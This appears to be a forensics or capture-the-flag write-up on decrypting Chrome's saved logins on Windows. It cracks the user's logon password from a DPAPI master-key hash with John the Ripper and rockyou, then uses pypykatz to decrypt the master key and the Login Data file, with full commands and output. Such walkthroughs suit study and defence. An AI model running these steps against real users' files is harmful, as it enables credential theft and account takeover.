
## Overview
Chrome uses aes-gcm to encrypt saved login passwords. The aes key is saved in in AppData directory in base64 after being encrypted with an os-specific method. In windows, this method is dpapi. The dpapi master key is also saved in AppData directory. The secrets used for encrypting the dpapi are the user sid and password (used to log in windows).

The plan is pretty straight forward:
1. Find user sid
2. Bruteforce user password
3. Decrypt dpapi master key using the above two
4. Decrypt aes key using the above
5. Decrypt saved login

## Decrypt dpapi master key
The encrypted master key is the file **AppData/Roaming/Microsoft/Protect/S-1-5-21-3702016591-3723034727-1691771208-1002/865be7a6-863c-4d73-ac9f-233f8734089d**.

The secret information used for encrypting it is the user SID and windows logon password. The SID is the name of the directory where the encrypted master key file resides. The only missing piece is the user password, let's crack it!

### Obtain dpapi master key hash

First we need to use a python script called **DPAPImk2john** (comes with John the Ripper jumbo) to obtain the target hash:

```bash
DPAPImk2john -S S-1-5-21-3702016591-3723034727-1691771208-1002 -mk 865be7a6-863c-4d73-ac9f-233f8734089d -c local | tee hash
```
```
$DPAPImk$2*1*S-1-5-21-3702016591-3723034727-1691771208-1002*aes256*sha512*8000*a17612a0ebdfc203316e0c18c04729f1*288*7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc
```

### Bruteforce user logon password
```bash
john --format=DPAPImk hash -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```
```
ransom           (?)
```

### Decrypt key
Now we can decrypt the master key. For this we will use a platform-agnostic version of **mimikatz**; enter **pypykatz**.

First we need to generate candidate prekeys based on SID and password:
```bash
pypykatz dpapi prekey password S-1-5-21-3702016591-3723034727-1691771208-1002 ransom | tee prekeys
```
```
87ca22100fa54e86e4a2c476f67addf6b4375933
6ab24a899ad96bddd85374197b3402f72c0d33bf
4be3d408d12b0371839dabef088686ffb777e1d9
```

Let's crack it!
```bash
pypykatz dpapi masterkey 865be7a6-863c-4d73-ac9f-233f8734089d prekeys
```
```
[GUID] 865be7a6-863c-4d73-ac9f-233f8734089d [MASTERKEY] 138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630
```

## Decrypt saved login
First let's dump the decrypted masterkey in a format usable with pypykatz _dpapi blob_ command:
```bash
pypykatz dpapi masterkey 865be7a6-863c-4d73-ac9f-233f8734089d prekeys -o mkf
```

As of v0.5.8, pypykatz has a chrome-specific command for decoding saved logins and cookies offline. It needs the file **AppData/Local/Google/Chrome/User Data/Local State** because this is where the chrome aes key is stored, as well as **AppData/Local/Google/Chrome/User Data/Default/Login Data** which contains the saved login:
```bash
pypykatz dpapi chrome mkf 'Local State' --logindata 'Login Data'
```